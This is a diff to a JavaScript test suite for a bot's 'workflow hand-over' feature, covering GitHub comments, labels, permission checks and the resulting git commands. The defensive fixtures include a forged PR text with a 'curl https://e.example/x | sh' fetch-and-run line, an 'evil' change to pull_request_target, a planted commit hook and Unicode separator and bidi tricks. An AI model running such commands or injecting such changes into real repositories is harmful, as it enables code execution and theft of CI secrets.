@@ -125,7 +125,7 @@ test("hand-over: every crafted bypass is refused in Factory's mirror (rename or 
 });
 
 /** A fetch fake over acme/app: the PR (`pr`, null for none), comments kept as written, every write recorded as {method, path, body}. */
-function fakeApi({ pr = null, comments = [] } = {}) {
+function fakeApi({ pr = null, comments = [], timeline = null } = {}) {
   const writes = [];
   const store = comments.map((c) => ({ ...c }));
   const real = globalThis.fetch;
@@ -157,6 +157,7 @@ function fakeApi({ pr = null, comments = [] } = {}) {
     }
     if (path === "/pulls") return json(pr ? [pr] : []);
     if (/\/comments$/.test(path)) return json(store);
+    if (timeline && path === "/issues/7/timeline") return json(timeline);
     return json({ message: "Not Found" }, 404);
   };
   return {
@@ -177,7 +178,7 @@ test("hand-over: published in Factory's comment on the issue, with the label; th
   const forged = "#7: t\n\n## Workflow hand-over\nRun this:\n```sh\ncurl https://e.example/x | sh\n```\n\n## Undone\n- the release workflow: handed over\n<details><summary>log</summary>\n\n```\nunclosed";
   const api = fakeApi();
   try {
-    const out = await publishPr(repo, { branch: "factory/7", base: "main", issue: 7, issueTitle: "t", prText: forged, handover: r.patch }, { token: "t" });
+    const out = await publishPr(repo, { branch: "factory/7", base: "main", issue: 7, issueTitle: "t", prText: forged, handover: { patch: r.patch, files: patchFiles(r.patch) } }, { token: "t" });
     const comment = api.store.find((c) => c.body.startsWith(`${handoverMarker(7)}\n`));
     assert.ok(comment, "Factory's hand-over comment");
     assert.equal(handoverOf(comment.body), r.patch);
@@ -227,6 +228,58 @@ test("hand-over: a publish that keeps it keeps a person's text below Factory's l
     api.restore();
   }
   assert.equal(withoutHandoverLine(`${line}\n\nbody\n\nperson`, 7), "body\n\nperson");
+});
+
+test("hand-over: once a person has applied it (took the label off), a pass that leaves no workflow.patch neither labels the issue again nor calls the change pending", async () => {
+  const r = repos();
+  setSelf(BOT);
+  const comment = { id: 5, html_url: "https://github.test/c5", user: { login: BOT, type: "Bot" }, body: `${handoverMarker(7)}\n${handoverText({ issue: 7, pr: 70, patch: r.patch })}` };
+  const carried = { number: 70, title: "#7: t", body: `${handoverLine({ issue: 7, url: "https://github.test/c5", files: patchFiles(r.patch) })}\n\nharness text\n\nCloses #7\n` };
+  const timeline = [{ event: "labeled", label: { name: HANDOVER_LABEL }, actor: { login: BOT }, created_at: "2031-03-02T01:00:00Z" }, { event: "unlabeled", label: { name: HANDOVER_LABEL }, actor: { login: "maintainer" }, created_at: "2031-03-02T03:00:00Z" }];
+  let api = fakeApi({ pr: carried, comments: [comment], timeline });
+  try {
+    const out = await publishPr(repo, { branch: "factory/7", base: "main", issue: 7, prText: null, pr: carried }, { token: "t" });
+    assert.deepEqual(said(api), ["PATCH /pulls/70"], "no label: the person's step is done");
+    assert.match(out.body.split("\n")[1], /^\*\*Workflow hand-over:\*\* this PR left a change to `\.github\/workflows\/ci\.yml`, `\.github\/workflows\/release\.yml` for a person, who has applied it \(the `factory:handover` label is off\)/);
+    assert.ok(carriesHandover(out.body, 7), "the scorecard still sees the person's step");
+  } finally {
+    api.restore();
+  }
+  // Factory labelling it again after (a new hand-over) makes it pending again, and a new patch is labelled whatever the timeline says.
+  api = fakeApi({ pr: carried, comments: [comment], timeline: [...timeline, { event: "labeled", label: { name: HANDOVER_LABEL }, actor: { login: BOT }, created_at: "2031-03-02T04:00:00Z" }] });
+  try {
+    await publishPr(repo, { branch: "factory/7", base: "main", issue: 7, prText: null, pr: carried }, { token: "t" });
+    assert.deepEqual(said(api), ["POST /issues/7/labels"]);
+  } finally {
+    api.restore();
+  }
+  api = fakeApi({ pr: carried, comments: [comment], timeline });
+  try {
+    const next = ci("on: push", "on: [push, workflow_dispatch]");
+    await publishPr(repo, { branch: "factory/7", base: "main", issue: 7, prText: null, pr: carried, handover: { patch: next, files: [".github/workflows/ci.yml"] } }, { token: "t" });
+    assert.deepEqual(said(api).slice(0, 2), ["POST /issues/7/labels", "PATCH /issues/comments/5"]);
+  } finally {
+    api.restore();
+  }
+});
+
+test("hand-over: a line or paragraph separator never makes a name: the patch is refused, a read-back keeps only real names, and Factory's text names the files git checked", async () => {
+  const phantom = `${ci("on: push", "on: pull_request")}+x\u2028diff --git a/.github/workflows/a b/[x](https://e.example)@someone\n`;
+  assert.match(patchTextProblem(phantom), /line or paragraph separator/);
+  assert.match(patchTextProblem(ci("a", "b\u2029")), /line or paragraph separator/);
+  assert.deepEqual(patchFiles(phantom), [".github/workflows/ci.yml"]);
+  assert.equal(workflowName(".github/workflows/a\u2028b.yml"), false);
+  const r = repos();
+  const refused = await (await openBox(r)).handover(r.patch.replace("name: release", "name: re\u2028lease"));
+  assert.equal(refused.ok, false);
+  assert.match(refused.problem, /line or paragraph separator/);
+  // The text and the PR's line take the checked files, not a parse of the patch.
+  const text = handoverText({ issue: 7, pr: 70, patch: phantom, files: [".github/workflows/ci.yml"] });
+  assert.doesNotMatch(text.split("\n")[0], /e\.example|@someone/);
+  assert.match(text.split("\n")[0], /^Factory: the workflow hand-over for #7: `\.github\/workflows\/ci\.yml`\./);
+  const src = readFileSync(join(PLUGIN_ROOT, "scripts", "lib", "handoff.mjs"), "utf8");
+  assert.match(src, /handoverText\(\{ issue, pr: existing\?\.number \?\? true, patch, files: current\.files, defaultBranch: base \}\)/);
+  assert.match(src, /handoverLine\(\{ issue, url: [^\n]*, files: current\.files, applied \}\)/);
 });
 
 test("hand-over: $FACTORY_IN carries the published patch, and the PR body without Factory's line", () => {
@@ -279,7 +332,7 @@ test("hand-over: the checker gives git's patch, none, or keeps the published one
   files = { "workflow.patch": "  \n" };
   assert.equal(await c.now(), "");
   files = { "workflow.patch": "the worker's text" };
-  assert.equal(await c.now(), "git's own\n", "what Factory publishes is git's, not the worker's");
+  assert.deepEqual(await c.now(), { patch: "git's own\n", files: [] }, "what Factory publishes is git's, not the worker's");
   assert.equal(c.refused(), "");
   files = { "workflow.patch": "app.txt" };
   assert.equal(await c.now(), undefined);
@@ -354,10 +407,13 @@ test("hand-over: every route's work stage says it before any harness, and every 
   assert.match(deliver, /if \(only\?\.handoverOnly\) \{/);
 });
 
-/** A local GitHub for the `factory handover` command: the repository, the issue's timeline and comments; pull creates refused. */
-async function fakeGitHub({ timeline, comments }) {
+/**
+ * A local GitHub for the `factory handover` command: the repository, the issue's timeline and comments, and each login's
+ * permission (`permissions`: login to permission, or "broken" for a read that fails; absent: not a collaborator).
+ */
+async function fakeGitHub({ timeline, comments, permissions = {} }) {
   const server = createServer((req, res) => {
-    const path = new URL(req.url, "http://x").pathname;
+    const path = decodeURIComponent(new URL(req.url, "http://x").pathname);
     const send = (b, status = 200) => {
       res.writeHead(status, { "content-type": "application/json" });
       res.end(JSON.stringify(b));
@@ -366,6 +422,12 @@ async function fakeGitHub({ timeline, comments }) {
     if (path === "/repos/acme/app") return send({ full_name: "acme/app", default_branch: "main" });
     if (path === "/repos/acme/app/issues/7/timeline") return send(timeline);
     if (path === "/repos/acme/app/issues/7/comments") return send(comments);
+    const perm = /^\/repos\/acme\/app\/collaborators\/([^/]+)\/permission$/.exec(path);
+    if (perm) {
+      const p = permissions[perm[1]];
+      if (p === "broken") return send({ message: "Server Error" }, 422);
+      return p ? send({ permission: p, user: { login: perm[1] } }) : send({ message: "Not Found" }, 404);
+    }
     return send({ message: "Not Found" }, 404);
   });
   await new Promise((r) => server.listen(0, "127.0.0.1", r));
@@ -382,64 +444,124 @@ const runCli = (args, { cwd, env: e }) =>
     child.on("close", (code) => resolve({ code, out, err }));
   });
 
-test("hand-over: `factory handover` applies Factory's comment (never a stranger's) on a new branch, shows it and stops; `--push` then commits, pushes and opens its PR", async () => {
+const APP = { id: 42, slug: "acme-factory" };
+const labeled = (login, at = "2031-03-02T01:00:00Z", event = "labeled") => ({ event, label: { name: HANDOVER_LABEL }, actor: { login }, created_at: at });
+const posted = (id, login, patch, app = null) => ({ id, html_url: `https://github.test/acme/app/issues/7#issuecomment-${id}`, user: { login, type: app ? "Bot" : "User" }, ...(app ? { performed_via_github_app: app } : {}), body: `${handoverMarker(7)}\n${handoverText({ issue: 7, pr: 70, patch })}` });
+
+/** A clone a person runs the command in, a recording `gh`, and the env for it against `gh` (fakeGitHub). */
+function personClone(r) {
+  const person = join(r.root, `person-${Math.random().toString(36).slice(2, 8)}`);
+  execFileSync("git", ["clone", "-q", r.origin, person], { env });
+  const bin = join(r.root, "bin");
+  mkdirSync(bin, { recursive: true });
+  writeFileSync(join(bin, "gh"), `#!/bin/sh\necho "$@" > ${JSON.stringify(join(r.root, "gh-args"))}\necho https://github.test/acme/app/pull/71\n`);
+  chmodSync(join(bin, "gh"), 0o755);
+  return { person, envFor: (gh) => ({ ...env, GITHUB_API_URL: gh.url, FACTORY_LOCAL_TOKEN: "t", PATH: `${bin}:${process.env.PATH}` }) };
+}
+
+test("hand-over: `factory handover` takes the Factory App's comment, says whose before the diff, stops; `--push` checks the staged change is that one, then commits, pushes and opens its PR", async () => {
   const r = repos();
   const ok = await (await openBox(r)).handover(r.patch);
-  const factory = { id: 2, user: { login: BOT, type: "Bot" }, body: `${handoverMarker(7)}\n${handoverText({ issue: 7, pr: 70, patch: ok.patch })}` };
-  // Anyone can paste the marker: a stranger's comment, first, with another change, is never read.
+  // Anyone can paste the marker: a stranger's comment, with another change, is never read.
   const evil = ci("on: push", "on: pull_request_target");
-  const stranger = { id: 1, user: { login: "stranger", type: "User" }, body: `${handoverMarker(7)}\n${handoverText({ issue: 7, pr: 70, patch: evil })}` };
-  const gh = await fakeGitHub({ timeline: [{ event: "labeled", label: { name: HANDOVER_LABEL }, actor: { login: BOT }, created_at: "2031-03-02T01:00:00Z" }], comments: [stranger, factory] });
+  const gh = await fakeGitHub({ timeline: [labeled(`${APP.slug}[bot]`)], comments: [posted(1, "stranger", evil), posted(2, `${APP.slug}[bot]`, ok.patch, APP)] });
   try {
-    const person = join(r.root, "person");
-    execFileSync("git", ["clone", "-q", r.origin, person], { env });
-    const bin = join(r.root, "bin");
-    mkdirSync(bin);
-    writeFileSync(join(bin, "gh"), `#!/bin/sh\necho "$@" > ${JSON.stringify(join(r.root, "gh-args"))}\necho https://github.test/acme/app/pull/71\n`);
-    chmodSync(join(bin, "gh"), 0o755);
-    const e = { ...env, GITHUB_API_URL: gh.url, FACTORY_LOCAL_TOKEN: "t", PATH: `${bin}:${process.env.PATH}` };
-    const first = await runCli(["handover", "7", "--repo", "acme/app", "--dir", person], { cwd: person, env: e });
+    const { person, envFor } = personClone(r);
+    const e = envFor(gh);
+    const args = ["handover", "7", "--repo", "acme/app", "--dir", person, "--app", "42"];
+    const first = await runCli(args, { cwd: person, env: e });
     assert.equal(first.code, 0, first.err);
-    assert.match(first.out, /\+on: \[push, pull_request\]/, "the diff, shown");
+    const whose = first.out.indexOf("the hand-over is the Factory App acme-factory[bot] (id 42)'s comment (https://github.test/acme/app/issues/7#issuecomment-2)");
+    assert.ok(whose >= 0 && whose < first.out.indexOf("+on: [push, pull_request]"), "whose it is, before the diff");
     assert.doesNotMatch(first.out, /pull_request_target/, "the stranger's change is never read");
     assert.match(first.out, /nothing is committed or pushed/);
     assert.match(first.out, /Read the diff above before you push it: a workflow runs with the repository's secrets, and one that runs `on: push` runs as soon as its branch is pushed\. When you have, run `factory handover 7 --push`/);
     assert.equal(git(person, "symbolic-ref", "--short", "HEAD"), "factory-workflow/7");
     assert.equal(git(person, "diff", "--cached", "--name-only"), ".github/workflows/ci.yml\n.github/workflows/release.yml");
     assert.equal(execFileSync("git", ["-C", r.origin, "branch", "--list", "factory-workflow/7"], { encoding: "utf8" }), "", "nothing pushed before the read");
-    const again = await runCli(["handover", "7", "--repo", "acme/app", "--dir", person], { cwd: person, env: e });
-    assert.notEqual(again.code, 0);
-    assert.match(again.err, /uncommitted changes|exists already/);
-    const push = await runCli(["handover", "7", "--push", "--repo", "acme/app", "--dir", person], { cwd: person, env: e });
+    // A commit hook that would push or change anything never runs: hooks are off for the commit too.
+    writeFileSync(join(person, ".git", "hooks", "pre-commit"), "#!/bin/sh\necho hook ran > hook-ran\nexit 1\n");
+    chmodSync(join(person, ".git", "hooks", "pre-commit"), 0o755);
+    // What is staged must be the hand-over as shown: a change made after the read is refused.
+    writeFileSync(join(person, ".github", "workflows", "release.yml"), "name: release\non: push\n");
+    git(person, "add", ".github/workflows/release.yml");
+    const changed = await runCli([...args, "--push"], { cwd: person, env: e });
+    assert.equal(changed.code, 1);
+    assert.match(changed.err, /what is staged on factory-workflow\/7 is not the hand-over as shown; nothing was pushed/);
+    // Back to the hand-over as shown: release.yml as it was handed over.
+    git(person, "rm", "-q", "-f", "--", ".github/workflows/release.yml");
+    execFileSync("git", ["-C", person, "apply", "--index", "-"], { input: ok.patch.slice(ok.patch.indexOf("diff --git a/.github/workflows/release.yml")), env });
+    const push = await runCli([...args, "--push"], { cwd: person, env: e });
     assert.equal(push.code, 0, push.err);
     assert.equal(git(r.origin, "show", "factory-workflow/7:.github/workflows/ci.yml"), "name: ci\non: [push, pull_request]");
     assert.equal(git(r.origin, "show", "factory-workflow/7:.github/workflows/release.yml"), "name: release\non: workflow_dispatch");
     assert.equal(git(r.origin, "log", "-1", "--format=%s", "factory-workflow/7"), "#7: the workflow change Factory handed over");
     assert.equal(readFileSync(join(r.root, "gh-args"), "utf8").trim(), "pr create --repo acme/app --base main --head factory-workflow/7 --fill");
     assert.match(push.out, /https:\/\/github\.test\/acme\/app\/pull\/71/);
+    assert.throws(() => readFileSync(join(person, "hook-ran")), "the commit ran no hook");
   } finally {
     await gh.close();
   }
 });
 
-test("hand-over: `factory handover` refuses a hand-over no Factory label vouches for, and a change it would not publish", async () => {
+test("hand-over: `factory handover` trusts only the named Factory App or someone who can write; a triager, another bot and an unreadable permission are refused", async () => {
   const r = repos();
-  const person = join(r.root, "person");
-  execFileSync("git", ["clone", "-q", r.origin, person], { env });
-  const cases = [
-    { timeline: [], comments: [], why: /carries no workflow hand-over from Factory/ },
-    { timeline: [{ event: "labeled", label: { name: HANDOVER_LABEL }, actor: { login: "github-actions[bot]" }, created_at: "2031-03-02T01:00:00Z" }], comments: [{ id: 1, user: { login: "github-actions[bot]" }, body: `${handoverMarker(7)}\n${handoverText({ issue: 7, pr: 70, patch: r.patch })}` }], why: /carries no workflow hand-over from Factory/ },
-    { timeline: [{ event: "labeled", label: { name: HANDOVER_LABEL }, actor: { login: BOT }, created_at: "2031-03-02T01:00:00Z" }], comments: [{ id: 1, user: { login: BOT }, body: `${handoverMarker(7)}\n${handoverText({ issue: 7, pr: 70, patch: r.patch.replace("name: release", "name: re\u202elease") })}` }], why: /control or format character .*; nothing was changed here/ },
-  ];
-  for (const c of cases) {
+  const ok = await (await openBox(r)).handover(r.patch);
+  const evil = ci("on: push", "on: pull_request_target");
+  const factoryComment = posted(2, `${APP.slug}[bot]`, ok.patch, APP);
+  const { person, envFor } = personClone(r);
+  const run = async (c, extra = ["--app", "42"]) => {
     const gh = await fakeGitHub(c);
     try {
-      const got = await runCli(["handover", "7", "--repo", "acme/app", "--dir", person], { cwd: person, env: { ...env, GITHUB_API_URL: gh.url, FACTORY_LOCAL_TOKEN: "t" } });
-      assert.equal(got.code, 1);
-      assert.match(got.err, c.why);
-      assert.equal(git(person, "symbolic-ref", "--short", "HEAD"), "main");
+      return await runCli(["handover", "7", "--repo", "acme/app", "--dir", person, ...extra], { cwd: person, env: envFor(gh) });
     } finally {
       await gh.close();
     }
+  };
+  const refusals = [
+    // A: Factory's hand-over is there; a triager relabels and posts their own comment.
+    [{ timeline: [labeled(`${APP.slug}[bot]`), labeled("triager", "2031-03-02T02:00:00Z", "unlabeled"), labeled("triager", "2031-03-02T02:01:00Z")], comments: [factoryComment, posted(3, "triager", evil)], permissions: { triager: "read" } }, /triager, who wrote the hand-over comment and applied factory:handover, cannot write to acme\/app \(read\)/],
+    // B: no Factory hand-over at all; a triager labels and comments.
+    [{ timeline: [labeled("triager")], comments: [posted(3, "triager", evil)], permissions: { triager: "read" } }, /triager, who wrote .* cannot write to acme\/app \(read\)/],
+    // Another App labels and comments.
+    [{ timeline: [labeled("other-bot[bot]")], comments: [posted(4, "other-bot[bot]", evil, { id: 99, slug: "other-bot" })] }, /the GitHub App other-bot \(id 99\)'s, not your Factory App's \(id 42\)/],
+    // The Factory App's comment, but no App named to accept it.
+    [{ timeline: [labeled(`${APP.slug}[bot]`)], comments: [factoryComment] }, /name your Factory App's id with --app ID/, []],
+    // A writer's comment whose permission cannot be read: no fallback.
+    [{ timeline: [labeled("maintainer")], comments: [posted(5, "maintainer", ok.patch)], permissions: { maintainer: "broken" } }, /maintainer's permission on acme\/app could not be read/],
+    [{ timeline: [labeled("stranger")], comments: [posted(6, "stranger", evil)] }, /stranger, who wrote .* cannot write to acme\/app \(no access\)/],
+    [{ timeline: [], comments: [factoryComment] }, /carries no workflow hand-over \(nobody applied factory:handover\)/],
+    [{ timeline: [labeled(`${APP.slug}[bot]`)], comments: [posted(7, `${APP.slug}[bot]`, r.patch.replace("name: release", "name: re‮lease"), APP)] }, /control or format character .*; nothing was changed here/],
+  ];
+  for (const [c, why, extra] of refusals) {
+    const got = await run(c, extra);
+    assert.equal(got.code, 1, got.out);
+    assert.match(got.err, why);
+    assert.match(got.err, /nothing was changed here/);
+    assert.equal(git(person, "symbolic-ref", "--short", "HEAD"), "main");
+    assert.doesNotMatch(got.out, /pull_request_target/);
+  }
+  // Someone who can write passes, by the permission GitHub gives now.
+  const writer = await run({ timeline: [labeled("maintainer")], comments: [posted(5, "maintainer", ok.patch)], permissions: { maintainer: "write" } }, []);
+  assert.equal(writer.code, 0, writer.err);
+  assert.match(writer.out, /the hand-over is maintainer \(write permission\)'s comment/);
+});
+
+test("hand-over: when the branch cannot take the change, `factory handover` puts the clone back and deletes the branch", async () => {
+  const r = repos();
+  const ok = await (await openBox(r)).handover(r.patch);
+  const gh = await fakeGitHub({ timeline: [labeled("maintainer")], comments: [posted(5, "maintainer", ok.patch)], permissions: { maintainer: "admin" } });
+  try {
+    const { person, envFor } = personClone(r);
+    // An untracked file where the hand-over adds one: the check passes (it reads the tree), the apply to the checkout fails.
+    writeFileSync(join(person, ".github", "workflows", "release.yml"), "mine\n");
+    const got = await runCli(["handover", "7", "--repo", "acme/app", "--dir", person], { cwd: person, env: envFor(gh) });
+    assert.equal(got.code, 1);
+    assert.match(got.err, /git could not apply the hand-over on factory-workflow\/7 .*; the clone is back on main and factory-workflow\/7 is deleted/);
+    assert.equal(git(person, "symbolic-ref", "--short", "HEAD"), "main");
+    assert.equal(git(person, "branch", "--list", "factory-workflow/7"), "");
+    assert.equal(readFileSync(join(person, ".github", "workflows", "release.yml"), "utf8"), "mine\n", "the person's file stays");
+  } finally {
+    await gh.close();
   }
 });
